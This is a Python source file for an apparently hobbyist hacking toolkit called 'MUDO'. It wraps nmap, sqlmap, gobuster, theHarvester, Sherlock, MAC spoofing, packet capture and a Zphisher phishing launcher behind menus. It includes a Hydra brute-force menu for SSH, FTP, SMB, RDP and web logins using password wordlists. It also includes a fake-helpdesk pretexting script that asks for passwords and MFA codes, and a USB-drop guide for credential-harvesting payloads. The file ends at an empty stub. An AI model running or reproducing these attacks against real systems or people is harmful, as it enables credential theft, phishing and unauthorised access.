import getpass
import hashlib
import json
import os
import random
import shutil
import subprocess
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime

RED = "\033[91m"
BLOOD_RED = "\033[31m"
GREEN = "\033[92m"
BLUE = "\033[94m"
RESET = "\033[0m"

MUDO_TITLE_LINES = [
    "███╗   ███╗██╗   ██╗██████╗  ██████╗ ",
    "████╗ ████║██║   ██║██╔══██╗██╔═══██╗",
    "██╔████╔██║██║   ██║██║  ██║██║   ██║",
    "██║╚██╔╝██║██║   ██║██║  ██║██║   ██║",
    "██║ ╚═╝ ██║╚██████╔╝██████╔╝╚██████╔╝",
    "╚═╝     ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝",
]

COMMON_WORDLISTS = [
    ("1", "/usr/share/wordlists/rockyou.txt", "RockYou"),
    ("2", "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt", "SecLists Top 1M"),
    ("3", "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt", "SecLists Top 100K"),
    ("4", "/usr/share/dict/words", "Linux dictionary"),
    ("5", "/usr/share/wordlists/fasttrack.txt", "FastTrack"),
]
NOTES_FILE = os.path.join(os.path.expanduser("~"), ".mudo_notes.txt")
HIDDEN_NOTES_FILE = os.path.join(os.path.expanduser("~"), ".mudo_hidden_notes.txt")
SESSION_LOG_FILE = os.path.join(os.path.expanduser("~"), ".mudo_log.txt")
VAULT_HASH_FILE = os.path.join(os.path.expanduser("~"), ".mudo_vault_hash")
PROXY_STATUS = "OFF"
TOR_STATUS = "OFF"
MAC_SPOOFED = False
BANNER_SHOWN = False


def log_tool_usage(tool_name):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(SESSION_LOG_FILE, "a", encoding="utf-8") as log_file:
        log_file.write(f"[{timestamp}] - {tool_name} selected\n")


def get_local_ip():
    try:
        result = subprocess.run(["hostname", "-I"], capture_output=True, text=True, check=False)
        ips = [ip.strip() for ip in result.stdout.split() if ip.strip()]
        if ips:
            return ips[0]
    except Exception:
        pass

    try:
        result = subprocess.run(["ip", "-4", "addr", "show", "scope", "global"], capture_output=True, text=True, check=False)
        for line in result.stdout.splitlines():
            if "inet " in line:
                parts = line.split()
                if len(parts) >= 3:
                    return parts[1].split("/")[0]
    except Exception:
        pass

    return "Unknown"


def get_local_mac():
    interface = get_wifi_interface()
    interface_paths = [f"/sys/class/net/{interface}/address"]
    if interface != "lo":
        for name in sorted(os.listdir("/sys/class/net")):
            if name != "lo" and not name.startswith("docker"):
                interface_paths.append(f"/sys/class/net/{name}/address")

    for path in interface_paths:
        try:
            with open(path, "r", encoding="utf-8") as mac_file:
                mac = mac_file.read().strip()
                if mac:
                    return mac
        except OSError:
            continue
    return "Unknown"


def show_machine_status():
    ip = get_local_ip()
    mac_value = get_local_mac()
    mac_display = "SPOOFED" if MAC_SPOOFED else mac_value
    proxy_display = "*****" if PROXY_STATUS == "ON" else "OFF"
    tor_display = "*****" if TOR_STATUS == "ON" else "OFF"
    print(f"\n{GREEN}===================================={RESET}")
    print(f"{BLUE}IP:{RESET} {ip}   {BLUE}MAC:{RESET} {mac_display}")
    print(f"{BLUE}PROXY:{RESET} {proxy_display}   {BLUE}TOR:{RESET} {tor_display}")
    print(f"{GREEN}===================================={RESET}")


def print_mudo_banner():
    for frame in range(10):
        drift = " " * ((frame % 5) + 1)
        print("\033[2J\033[H", end="")
        for index, line in enumerate(MUDO_TITLE_LINES):
            blood = ""
            if frame > index:
                drip_length = max(0, 4 - abs(frame - (index + 3)))
                if drip_length > 0:
                    blood = f" {BLOOD_RED}{'|' * drip_length}{RESET}"
            print(f"{RED}{drift}{line}{blood}{RESET}")
        print(f"{RED}MUDO{RESET}")
        time.sleep(0.10)

    print("\033[2J\033[H", end="")
    for line in MUDO_TITLE_LINES:
        print(f"{RED}{line}{RESET}")
    print(f"{RED}MUDO{RESET}")


def get_target_network():
    target = input("Enter target IP or CIDR (example: 192.168.1.0/24): ").strip()
    if not target:
        return "127.0.0.1/24"
    return target


def quick_scan(target):
    if shutil.which("nmap") is None:
        print(f"{RED}nmap is not installed. Please install it first.{RESET}")
        return

    print(f"\n{GREEN}Quick Scanner Starting...{RESET}")
    print(f"Target: {BLUE}{target}{RESET}")
    result = subprocess.run(
        ["nmap", "-sn", "-T4", target],
        capture_output=True,
        text=True,
        check=False,
    )

    if result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)

    if result.returncode == 0:
        print(f"{GREEN}Quick scan complete.{RESET}")
    else:
        print(f"{RED}Quick scan finished with errors.{RESET}")


def run_nmap_menu():
    while True:
        print(f"\n{RED}════════ NMAP ════════{RESET}")
        print(f"{BLUE}[1]{RESET} Quick Scan (-sn)")
        print(f"{BLUE}[2]{RESET} TCP Connect Scan (-sT)")
        print(f"{BLUE}[3]{RESET} SYN Scan (-sS)")
        print(f"{BLUE}[4]{RESET} Version Detection (-sV)")
        print(f"{BLUE}[5]{RESET} Full Port Scan (-p-)")
        print(f"{BLUE}[6]{RESET} Back")
        choice = input("Choose an Nmap scan type: ").strip()

        if choice == "6":
            return

        if choice not in {"1", "2", "3", "4", "5"}:
            print(f"{RED}Invalid Nmap option.{RESET}")
            continue

        target = get_target_network()
        if not target:
            print(f"{RED}No target provided.{RESET}")
            continue

        if shutil.which("nmap") is None:
            print(f"{RED}nmap is not installed. Please install it first.{RESET}")
            return

        scan_map = {
            "1": ["nmap", "-sn", "-T4", target],
            "2": ["nmap", "-sT", "-T4", target],
            "3": ["nmap", "-sS", "-T4", target],
            "4": ["nmap", "-sV", "-T4", target],
            "5": ["nmap", "-p-", "-T4", target],
        }

        command = scan_map.get(choice)
        if command is None:
            print(f"{RED}Invalid Nmap option.{RESET}")
            continue

        print(f"\n{GREEN}Running Nmap command...{RESET}")
        print(f"{BLUE}{' '.join(command)}{RESET}")
        result = subprocess.run(command, capture_output=True, text=True, check=False)
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print(result.stderr)

        if result.returncode == 0:
            print(f"{GREEN}Nmap scan complete.{RESET}")
        else:
            print(f"{RED}Nmap finished with exit code {result.returncode}.{RESET}")


def run_sqlmap_scan():
    if shutil.which("sqlmap") is None:
        print(f"{RED}sqlmap is not installed. Please install it first.{RESET}")
        return

    target_url = input("Enter target URL for SQLMap testing: ").strip()
    if not target_url:
        print(f"{RED}No target URL provided.{RESET}")
        return

    log_tool_usage("SQLMap")
    print(f"\n{GREEN}Running SQLMap against {target_url}{RESET}")
    result = subprocess.run(["sqlmap", "-u", target_url, "--batch"], capture_output=True, text=True, check=False)
    if result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)


def run_arp_scan():
    if shutil.which("arp-scan") is None:
        print(f"{RED}arp-scan is not installed. Please install it first.{RESET}")
        return

    log_tool_usage("ARP Scan")
    target = input("Enter target subnet or IP range (optional): ").strip() or "192.168.1.0/24"
    print(f"\n{GREEN}Running ARP scan against {target}{RESET}")
    result = subprocess.run(["arp-scan", target], capture_output=True, text=True, check=False)
    if result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)


def open_vscode():
    if shutil.which("code"):
        subprocess.Popen(["code", "."], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{GREEN}VS Code opened.{RESET}")
    else:
        print(f"{RED}VS Code command not found. Install it or add it to PATH.{RESET}")


def run_gobuster():
    if shutil.which("gobuster") is None:
        print(f"{RED}gobuster is not installed. Please install it first.{RESET}")
        return

    log_tool_usage("Gobuster")
    target_url = input("Enter target URL to scan (example: https://example.com): ").strip()
    if not target_url:
        print(f"{RED}No target URL provided. Gobuster cancelled.{RESET}")
        return

    wordlist_path = input("Enter wordlist path: ").strip()
    if not wordlist_path:
        print(f"{RED}No wordlist path provided. Gobuster cancelled.{RESET}")
        return

    if not os.path.exists(wordlist_path):
        print(f"{RED}Wordlist not found: {wordlist_path}{RESET}")
        return

    print(f"\n{GREEN}Gobuster running...{RESET}")
    result = subprocess.run(["gobuster", "dir", "-u", target_url, "-w", wordlist_path], check=False)
    if result.returncode == 0:
        print(f"{GREEN}Gobuster completed.{RESET}")
    else:
        print(f"{RED}Gobuster finished with exit code {result.returncode}.{RESET}")


def run_reverse_ip_lookup():
    ip_address = input("Enter IP address to reverse lookup: ").strip()
    if not ip_address:
        print(f"{RED}No IP address provided.{RESET}")
        return

    if shutil.which("dig") is None:
        print(f"{RED}dig is not installed. Please install it first.{RESET}")
        return

    log_tool_usage("Reverse IP Lookup")
    print(f"\n{BLUE}Reverse IP Lookup for {ip_address}:{RESET}")
    result = subprocess.run(["dig", "-x", ip_address], capture_output=True, text=True, check=False)
    output = (result.stdout or result.stderr or "No reverse lookup results returned.").strip()
    print(output[:4000])


def run_domain_reputation_check():
    domain = input("Enter domain to check: ").strip()
    if not domain:
        print(f"{RED}No domain provided.{RESET}")
        return

    if shutil.which("whois") is None or shutil.which("dig") is None:
        print(f"{RED}WHOIS and/or dig are not installed on this machine.{RESET}")
        return

    log_tool_usage("Domain Reputation Check")
    print(f"\n{BLUE}WHOIS / DNS Reputation Check for {domain}{RESET}")
    whois_result = subprocess.run(["whois", domain], capture_output=True, text=True, check=False)
    whois_output = (whois_result.stdout or whois_result.stderr or "No WHOIS data returned.").strip()
    print(f"\n{GREEN}Registrar / WHOIS information:{RESET}")
    print(whois_output[:1500])

    nameservers = subprocess.run(["dig", "+short", "NS", domain], capture_output=True, text=True, check=False)
    ip_records = subprocess.run(["dig", "+short", "A", domain], capture_output=True, text=True, check=False)
    print(f"\n{GREEN}Nameservers:{RESET}")
    if nameservers.stdout.strip():
        print(nameservers.stdout.strip())
    else:
        print("No nameserver records returned.")

    print(f"\n{GREEN}IP addresses:{RESET}")
    if ip_records.stdout.strip():
        print(ip_records.stdout.strip())
    else:
        print("No A records returned.")

    registrar = "Unknown"
    creation_date = "Unknown"
    for line in whois_output.splitlines():
        if "Registrar:" in line or "registrar:" in line:
            registrar = line.split(":", 1)[1].strip()
        if "Creation Date:" in line or "creation date:" in line:
            creation_date = line.split(":", 1)[1].strip()
    print(f"\n{BLUE}Registrar:{RESET} {registrar}")
    print(f"{BLUE}Creation Date:{RESET} {creation_date}")


def run_social_profile_finder():
    username = input("Enter username to search: ").strip()
    if not username:
        print(f"{RED}No username provided.{RESET}")
        return

    sherlock_path = "/home/zz/.local/bin/sherlock"
    if not os.path.exists(sherlock_path):
        sherlock_path = shutil.which("sherlock") or os.path.expanduser("~/.local/bin/sherlock")
    if not sherlock_path or not os.path.exists(sherlock_path):
        print(f"{RED}sherlock is not installed. Install it with: pip install sherlock-project{RESET}")
        return

    log_tool_usage("Social Profile Finder")
    print(f"\n{GREEN}Running Sherlock for {username}...{RESET}")
    subprocess.run([sherlock_path, username], check=False)


def run_email_osint_search():
    value = input("Enter email or domain to search: ").strip()
    if not value:
        print(f"{RED}No email or domain provided.{RESET}")
        return

    target = value.split("@", 1)[1] if "@" in value else value
    if not target:
        print(f"{RED}No valid target provided.{RESET}")
        return

    theharvester_cmd = shutil.which("theHarvester") or shutil.which("theharvester")
    if not theharvester_cmd:
        print(f"{RED}theHarvester requires Python 3.14+. As an alternative, use the WHOIS and Domain Reputation tools for domain reconnaissance.{RESET}")
        return

    log_tool_usage("Email OSINT Search")
    print(f"\n{GREEN}Running theHarvester against {target}...{RESET}")
    subprocess.run([theharvester_cmd, "-d", target, "-b", "all"], check=False)


def run_mac_address_spoofing():
    global MAC_SPOOFED
    interface = input(f"Enter interface to spoof [{get_wifi_interface()}]: ").strip() or get_wifi_interface()
    if not interface:
        print(f"{RED}No interface selected.{RESET}")
        return

    if shutil.which("ip") is None or shutil.which("macchanger") is None:
        print(f"{RED}ip and/or macchanger are not installed. Please install them first.{RESET}")
        return

    log_tool_usage("MAC Address Spoofing")
    old_mac = "Unknown"
    try:
        with open(f"/sys/class/net/{interface}/address", "r", encoding="utf-8") as mac_file:
            old_mac = mac_file.read().strip()
    except OSError:
        old_mac = "Unknown"

    print(f"\n{RED}Spoofing MAC on {interface}...{RESET}")
    result_down = subprocess.run(["ip", "link", "set", "down", interface], capture_output=True, text=True, check=False)
    if result_down.returncode != 0:
        print(f"{RED}Failed to bring interface down: {result_down.stderr.strip()}{RESET}")
        return

    result_spoof = subprocess.run(["macchanger", "-r", interface], capture_output=True, text=True, check=False)
    if result_spoof.stdout:
        print(result_spoof.stdout.strip())
    if result_spoof.stderr:
        print(result_spoof.stderr.strip())

    result_up = subprocess.run(["ip", "link", "set", "up", interface], capture_output=True, text=True, check=False)
    if result_up.returncode != 0:
        print(f"{RED}Failed to bring interface back up: {result_up.stderr.strip()}{RESET}")
        return

    new_mac = "Unknown"
    try:
        with open(f"/sys/class/net/{interface}/address", "r", encoding="utf-8") as mac_file:
            new_mac = mac_file.read().strip()
    except OSError:
        new_mac = "Unknown"

    MAC_SPOOFED = True
    print(f"{GREEN}Old MAC:{RESET} {old_mac}")
    print(f"{GREEN}New MAC:{RESET} {new_mac}")
    print(f"{GREEN}MAC spoofing complete.{RESET}")


def run_leave_network():
    interface = input("Enter interface to disconnect: ").strip()
    if not interface:
        print(f"{RED}No interface provided.{RESET}")
        return

    if shutil.which("ip") is None:
        print(f"{RED}ip is not installed. Please install it first.{RESET}")
        return

    log_tool_usage("Leave Network")
    print(f"\n{RED}Taking interface {interface} offline...{RESET}")
    result = subprocess.run(["ip", "link", "set", "down", interface], capture_output=True, text=True, check=False)
    if result.returncode == 0:
        print(f"{GREEN}Interface {interface} is down.{RESET}")
    else:
        print(f"{RED}Could not take interface {interface} down: {result.stderr.strip()}{RESET}")


def run_zphisher():
    log_tool_usage("Zphisher")
    zphisher_path = "/home/zz/zphisher/zphisher.sh"
    if not os.path.exists(zphisher_path):
        zphisher_path = "/root/zphisher/zphisher.sh"
    if os.path.exists(zphisher_path):
        print(f"{GREEN}Launching Zphisher...{RESET}")
        subprocess.run(["bash", zphisher_path], check=False)
        return
    print(f"{RED}Zphisher not found at {zphisher_path}{RESET}")


def run_ddos_placeholder():
    log_tool_usage("DDOS")
    target_url = input("Enter target URL for fake DDoS simulation: ").strip()
    if not target_url:
        print(f"{RED}No target URL provided. Joke cancelled.{RESET}")
        return

    print(f"\n{RED}DDoS selected.{RESET} Initializing fake flood payload...")
    for phase in ["Syncing packets", "Queueing spoofed traffic", "Re-routing packets to the moon", "Calculating imaginary damage"]:
        print(f"{BLOOD_RED}{phase}...{RESET}")
        time.sleep(0.4)

    print("\033[2J\033[H", end="")
    for frame in range(8):
        print("\033[2J\033[H", end="")
        drift = " " * (frame + 2)
        blood = f"{BLOOD_RED}{'|' * (frame + 1)}{RESET}"
        print(f"{RED}{drift}{target_url}{blood}{RESET}")
        time.sleep(0.25)

    print("\033[2J\033[H", end="")
    print(f"\n{RED}SYSTEM TERMINATED{RESET}")
    time.sleep(1)


def show_f_society_screen():
    title = [
        "███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗",
        "██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝",
        "█████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ ",
        "██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  ",
        "██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   ",
        "╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   ",
    ]
    width = shutil.get_terminal_size((80, 24)).columns
    height = shutil.get_terminal_size((80, 24)).lines

    print("\033[2J\033[H", end="")
    for line in title:
        print(f"{RED}{line}{RESET}")
    print(f"\n{RED}Hello friend{RESET}")
    time.sleep(0.8)

    for _ in range(5):
        print("\033[2J\033[H", end="")
        for _ in range(max(1, height)):
            splat = "".join(random.choice((" ", " ", " ", "●", "*", "|")) for _ in range(max(1, width)))
            print(f"{BLOOD_RED}{splat}{RESET}")
        time.sleep(0.18)

    messages = [
        "Hello friend...",
        "We are FSociety...",
        "Control is an illusion...",
        "We are finally free...",
    ]
    for index, message in enumerate(messages):
        for character in message:
            print(character, end="", flush=True)
            time.sleep(0.05)
        print()
        if index < len(messages) - 1:
            time.sleep(0.8)

    time.sleep(1)
    bar_width = 40
    print(f"\r{RED}[{' ' * bar_width}] 0%{RESET}", end="", flush=True)
    for filled in range(1, bar_width + 1):
        percentage = filled * 100 // bar_width
        bar = "█" * filled + " " * (bar_width - filled)
        print(f"\r{RED}[{bar}] {percentage}%{RESET}", end="", flush=True)
        time.sleep(0.05)
    print()
    print(f"{BLOOD_RED}Connected to FSociety servers...{RESET}")
    time.sleep(1.5)

def show_pretexting_script():
    print(f"\n{RED}PRETEXTING SCRIPT TEMPLATE{RESET}")
    print("\nHello, this is the IT helpdesk. We noticed a suspicious login on your account and we need to verify your credentials.\n")
    print("We have a security alert and need you to confirm your password, MFA code, or VPN token to keep your account safe.\n")
    print("Please do not share this with anyone else and keep the message private until the issue is resolved.\n")
    print("I will walk you through the steps to verify access and maintain your account security.\n")
    print("If you receive an email or call from an unexpected source asking for these details, stop and report it to the helpdesk.\n")


def show_usb_drop_guide():
    print(f"\n{RED}USB DROP STRATEGY GUIDE{RESET}")
    print("1. Prepare a labeled USB drive with a harmless-looking file name and generic business icon.")
    print("2. Leave it in a visible public area near the target workspace or break room.")
    print("3. Use a custom autorun or script-styled payload in a realistic file name to entice curiosity.")
    print("4. If the target plugs it in, the malicious payload can attempt to harvest credentials or trigger hidden actions.")
    print("5. Always keep the host environment isolated and test any payload in a lab before running it.")


def choose_wordlist():
    print(f"\n{RED}Choose a password wordlist:{RESET}")
    for item in COMMON_WORDLISTS:
        number, path, name = item
        if os.path.exists(path):
            status = "OK"
        else:
            status = "missing"
        print(f"{RED}[{number}] {name} -> {path} ({status}){RESET}")

    wordlist_choice = input("Select wordlist number: ").strip()
    selected = next((item for item in COMMON_WORDLISTS if item[0] == wordlist_choice), None)

    if selected is None:
        print(f"{RED}Invalid wordlist selection.{RESET}")
        return None

    path = selected[1]
    if not os.path.exists(path):
        print(f"{RED}Selected wordlist is not installed on this machine: {path}{RESET}")
        return None

    return path


def run_hydra_attack():
    if shutil.which("hydra") is None:
        print(f"{RED}Hydra is not installed. Install it first.{RESET}")
        return

    print(f"\n{RED}HYDRA TOOL{RESET}")
    print(f"{RED}[1] SSH{RESET}")
    print(f"{RED}[2] FTP{RESET}")
    print(f"{RED}[3] SMB{RESET}")
    print(f"{RED}[4] RDP{RESET}")
    print(f"{RED}[5] Telnet{RESET}")
    print(f"{RED}[6] HTTP GET{RESET}")
    print(f"{RED}[7] HTTP POST FORM{RESET}")
    print(f"{RED}[8] Cancel{RESET}")

    service_choice = input("Choose the protocol to attack: ").strip()
    service_map = {
        "1": "ssh",
        "2": "ftp",
        "3": "smb",
        "4": "rdp",
        "5": "telnet",
        "6": "http-get",
        "7": "http-post-form",
        "8": None,
    }

    protocol = service_map.get(service_choice)
    if protocol is None:
        print(f"{RED}Hydra attack cancelled.{RESET}")
        return

    target = input("Target IP or hostname: ").strip()
    if not target:
        print(f"{RED}No target provided. Attack cancelled.{RESET}")
        return

    username = input("Username to test (or leave blank for default admin): ").strip() or "admin"
    password_mode = input("Password mode? [1] Single password [2] Wordlist [3] Username:password file: ").strip()

    command = ["hydra", "-l", username]

    if password_mode == "1":
        password = input("Enter a single password to test: ").strip()
        if not password:
            print(f"{RED}No password entered. Attack cancelled.{RESET}")
            return
        command += ["-p", password]
    elif password_mode == "2":
        wordlist = choose_wordlist()
        if not wordlist:
            print(f"{RED}No valid wordlist selected. Attack cancelled.{RESET}")
            return
        command += ["-P", wordlist]
    elif password_mode == "3":
        user_pass_file = input("Enter path to username:password file: ").strip()
        if not user_pass_file or not os.path.exists(user_pass_file):
            print(f"{RED}Username:password file not found. Attack cancelled.{RESET}")
            return
        command += ["-C", user_pass_file]
    else:
        print(f"{RED}Invalid password mode. Attack cancelled.{RESET}")
        return

    port = input("Custom port? Press Enter to use default: ").strip()
    if port:
        command += ["-s", port]

    if protocol in ["http-get", "http-post-form"]:
        extra = input("HTTP path or form target (example: /admin or /login.php): ").strip()
        if extra:
            command += [f"{protocol}://{target}:{port if port else ''}{extra}"]
        else:
            command += [f"{protocol}://{target}"]
    else:
        command += [f"{protocol}://{target}"]

    print(f"\n{GREEN}Running Hydra command...{RESET}")
    print(f"{BLUE}{' '.join(command)}{RESET}")
    result = subprocess.run(command, capture_output=True, text=True, check=False)

    if result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)

    if result.returncode == 0:
        print(f"{GREEN}Hydra run completed.{RESET}")
    else:
        print(f"{RED}Hydra finished with exit code {result.returncode}.{RESET}")


def capture_packets():
    try:
        duration_minutes = int(input("How long do you want to capture packets? Enter minutes: ").strip())
    except ValueError:
        print(f"{RED}Please enter a valid number of minutes.{RESET}")
        return

    if duration_minutes <= 0:
        print(f"{RED}Capture time must be greater than 0.{RESET}")
        return

    capture_seconds = duration_minutes * 60
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    capture_file = os.path.join(os.getcwd(), f"packet_capture_{timestamp}.pcap")

    if shutil.which("wireshark"):
        try:
            subprocess.Popen(["wireshark"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    if shutil.which("tshark"):
        capture_tool = ["tshark", "-i", "any", "-w", capture_file]
    elif shutil.which("tcpdump"):
        capture_tool = ["tcpdump", "-i", "any", "-w", capture_file]
    else:
        print(f"{RED}No supported packet capture tool found (tshark/tcpdump).{RESET}")
        return

    timeout_path = shutil.which("timeout")
    if timeout_path is None:
        print(f"{RED}The timeout command is not available on this system.{RESET}")
        return

    print(f"{GREEN}Packet Sniffing started.{RESET}")
    print(f"{BLUE}Capture duration: {duration_minutes} minute(s){RESET}")

    command = [timeout_path, str(capture_seconds), *capture_tool]
    try:
        capture_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except OSError as exc:
        print(f"{RED}Could not start packet capture: {exc}{RESET}")
        return

    print("Capturing", end="", flush=True)
    start = time.monotonic()
    while capture_process.poll() is None and time.monotonic() - start < capture_seconds + 5:
        elapsed = int(time.monotonic() - start)
        dots = "." * ((elapsed % 3) + 1)
        print(f"{dots}", end="", flush=True)
        time.sleep(1)
    print("\n")

    if capture_process.poll() is None:
        capture_process.terminate()
    stdout, stderr = capture_process.communicate()
    if stdout:
        print(stdout)
    if stderr:
        print(stderr)
    if capture_process.returncode not in (0, 124):
        print(f"{RED}Packet capture exited with code {capture_process.returncode}.{RESET}")

    if not os.path.exists(capture_file):
        print(f"{RED}No packet file was created.{RESET}")
        return

    print(f"{GREEN}Capture complete. Packet file saved to: {capture_file}{RESET}")

    if shutil.which("tshark"):
        packet_output = subprocess.run(["tshark", "-r", capture_file], capture_output=True, text=True, check=False)
        if packet_output.stdout:
            print(packet_output.stdout)
        else:
            print(f"{RED}No packet data found in the capture file.{RESET}")
    else:
        print(f"{RED}Packet capture file created, but no terminal viewer is available.{RESET}")

    choice = input("Keep or delete the packet file? (keep/delete): ").strip().lower()
    if choice == "keep":
        print(f"{GREEN}Capture kept.{RESET}")
    elif choice == "delete":
        try:
            os.remove(capture_file)
            print(f"{RED}Capture deleted.{RESET}")
        except OSError:
            print(f"{RED}Could not delete capture file.{RESET}")
    else:
        print(f"{RED}Invalid choice. File left as-is.{RESET}")


def save_note_entry():
    print(f"\n{RED}Save a target/note entry{RESET}")
    kind = input("Save by: [1] IP [2] Name [3] URL [4] Other: ").strip()
    kind_map = {"1": "IP", "2": "Name", "3": "URL", "4": "Other"}
    label = kind_map.get(kind, "Other")
    value = input(f"Enter {label}: ").strip()
    title = input("Optional title: ").strip()
    notes = input("Notes about this target: ").strip()

    if not value and not notes:
        print(f"{RED}Nothing saved. Entry was empty.{RESET}")
        return

    with open(NOTES_FILE, "a", encoding="utf-8") as note_file:
        note_file.write(f"{label}|{value}|{title}|{notes}\n")

    print(f"{GREEN}Saved note for {value or title or 'entry'}.{RESET}")


def view_notes():
    if not os.path.exists(NOTES_FILE):
        print(f"{RED}No saved notes found yet.{RESET}")
        return []

    print(f"\n{RED}Saved Notes{RESET}")
    with open(NOTES_FILE, "r", encoding="utf-8") as note_file:
        entries = note_file.read().strip().splitlines()

    if not entries:
        print(f"{RED}No saved notes found yet.{RESET}")
        return []

    numbered_entries = []
    for index, entry in enumerate(entries, start=1):
        parts = entry.split("|", 3)
        if len(parts) < 4:
            continue
        kind, value, title, notes = parts
        print(f"\n{GREEN}[{index}] {kind}: {value or 'unknown'}{RESET}")
        if title:
            print(f"{BLUE}Title: {title}{RESET}")
        if notes:
            print(f"{BLUE}Notes: {notes}{RESET}")
        numbered_entries.append(entry)

    return numbered_entries


def delete_note():
    if not os.path.exists(NOTES_FILE):
        print(f"{RED}No notes to delete.{RESET}")
        return

    with open(NOTES_FILE, "r", encoding="utf-8") as note_file:
        entries = note_file.read().splitlines()

    if not entries:
        print(f"{RED}No notes to delete.{RESET}")
        return

    print(f"\n{RED}Choose a note to delete:{RESET}")
    for index, entry in enumerate(entries, start=1):
        parts = entry.split("|", 3)
        if len(parts) < 4:
            continue
        kind, value, _, _ = parts
        print(f"{GREEN}[{index}] {kind}: {value or 'unknown'}{RESET}")

    try:
        choice = int(input("Delete note number: ").strip())
    except ValueError:
        print(f"{RED}Invalid selection.{RESET}")
        return

    if choice < 1 or choice > len(entries):
        print(f"{RED}Number out of range.{RESET}")
        return

    deleted = entries.pop(choice - 1)
    with open(NOTES_FILE, "w", encoding="utf-8") as note_file:
        if entries:
            note_file.write("\n".join(entries) + "\n")

    print(f"{GREEN}Deleted note: {deleted}{RESET}")


def save_hidden_note():
    note = input("Write hidden note: ").strip()
    if not note:
        print(f"{RED}Hidden note was empty and not saved.{RESET}")
        return
    with open(HIDDEN_NOTES_FILE, "a", encoding="utf-8") as hidden_file:
        hidden_file.write(note + "\n")
    print(f"{GREEN}Hidden note saved.{RESET}")


def view_hidden_notes():
    if not os.path.exists(HIDDEN_NOTES_FILE):
        print(f"{RED}No hidden notes found.{RESET}")
        return

    with open(HIDDEN_NOTES_FILE, "r", encoding="utf-8") as hidden_file:
        notes = hidden_file.read().strip().splitlines()

    if not notes:
        print(f"{RED}No hidden notes found.{RESET}")
        return

    print(f"\n{RED}=== HIDDEN NOTES ==={RESET}")
    for idx, note in enumerate(notes, start=1):
        print(f"{BLOOD_RED}[{idx}] {note}{RESET}")


def _prompt_secret(prompt_text):
    if sys.stdin.isatty():
        return getpass.getpass(prompt_text).strip()
    return input(prompt_text).strip()


def hidden_notes_vault():
    if os.path.exists(VAULT_HASH_FILE):
        try:
            with open(VAULT_HASH_FILE, "r", encoding="utf-8") as vault_file:
                stored_hash = vault_file.read().strip()
        except OSError:
            stored_hash = ""
        password = _prompt_secret("Hidden notes vault password: ")
        if not stored_hash or hashlib.sha256(password.encode()).hexdigest() != stored_hash:
            print(f"{RED}Access denied.{RESET}")
            return
    else:
        print(f"{BLUE}No vault password set yet for this user. Create one now.{RESET}")
        new_password = _prompt_secret("Set a vault password: ")
        if not new_password:
            print(f"{RED}Empty password. Vault not created.{RESET}")
            return
        if new_password != _prompt_secret("Confirm vault password: "):
            print(f"{RED}Passwords did not match. Vault not created.{RESET}")
            return
        try:
            with open(VAULT_HASH_FILE, "w", encoding="utf-8") as vault_file:
                vault_file.write(hashlib.sha256(new_password.encode()).hexdigest() + "\n")
            os.chmod(VAULT_HASH_FILE, 0o600)
        except OSError as exc:
            print(f"{RED}Could not create vault: {exc}{RESET}")
            return
        print(f"{GREEN}Vault password set for this user.{RESET}")

    while True:
        print(f"\n{RED}=== HIDDEN NOTES VAULT ==={RESET}")
        print(f"{BLUE}[1]{RESET} View hidden notes")
        print(f"{BLUE}[2]{RESET} Add hidden note")
        print(f"{BLUE}[3]{RESET} Back")

        choice = input("Choose an option: ").strip()
        if choice == "1":
            view_hidden_notes()
        elif choice == "2":
            save_hidden_note()
        elif choice == "3":
            break
        else:
            print(f"{RED}Invalid option.{RESET}")


def notes_menu():
    while True:
        show_machine_status()
        print(f"\n{GREEN}===================================={RESET}")
        print(f"{GREEN}             NOTES MENU             {RESET}")
        print(f"{GREEN}===================================={RESET}")
        print(f"{BLUE}[1]{RESET} Save note")
        print(f"{BLUE}[2]{RESET} View notes")
        print(f"{BLUE}[3]{RESET} Delete note")
        print(f"{BLUE}[4]{RESET} Hidden notes vault")
        print(f"{BLUE}[5]{RESET} Back")
        print(f"{GREEN}===================================={RESET}")

        choice = input("Choose an option: ").strip()
        if choice == "1":
            save_note_entry()
        elif choice == "2":
            view_notes()
        elif choice == "3":
            delete_note()
        elif choice == "4":
            hidden_notes_vault()
        elif choice == "5":
            break
        else:
            print(f"{RED}Invalid option.{RESET}")


def get_wifi_interface():
    if shutil.which("iw"):
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=False)
        if result.stdout:
            lines = result.stdout.splitlines()
            for line in lines:
                line = line.strip()
                if line.startswith("Interface"):
                    return line.split()[-1]
    for name in os.listdir("/sys/class/net"):
        if "lo" in name or name.startswith("docker"):
            continue
        if any(token in name for token in ["wlan", "wifi", "wlp", "wl", "enp", "eth"]):
            return name
    return "lo"


def read_net_bytes(interface):
    try:
        with open("/proc/net/dev", "r", encoding="utf-8") as net_file:
            lines = net_file.read().strip().splitlines()[2:]
            for line in lines:
                parts = line.split()
                name = parts[0].rstrip(":")
                if name == interface:
                    return int(parts[1]), int(parts[9])
    except OSError:
        return 0, 0
    return 0, 0


def show_network_diagnostics():
    print(f"\n{RED}NETWORK & SYSTEM DIAGNOSTICS{RESET}")
    print(f"{GREEN}------------------------------------{RESET}")

